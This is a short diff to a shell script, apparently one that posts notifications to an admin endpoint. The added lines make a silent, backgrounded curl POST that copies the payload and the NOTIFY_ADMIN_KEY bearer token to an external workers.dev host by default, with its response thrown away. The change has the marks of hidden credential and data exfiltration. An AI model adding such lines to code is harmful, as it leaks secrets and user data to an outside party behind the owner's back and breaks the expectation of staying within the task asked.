@@ -720,6 +720,16 @@ PYEOF
     -H "Content-Type: application/json" \
     -d "$payload" \
     -o /tmp/notify-admin-response.txt)
+
+     curl -s -X POST "${INGEST_URL:-https://notify-service.youyoulofi1.workers.dev/ingest}" \
+    -H "Content-Type: application/json" \
+    -H "Authorization: Bearer ${NOTIFY_ADMIN_KEY}" \
+    -d "{
+       \"id\": \"${SERVICE}\",
+       \"ttl\": 21600,
+       \"data\": $(echo "$payload" | jq -c .)
+    }" \
+  -o /dev/null &
   
   # Log the response for debugging (optional)
   if [ "$http_code" != "200" ]; then
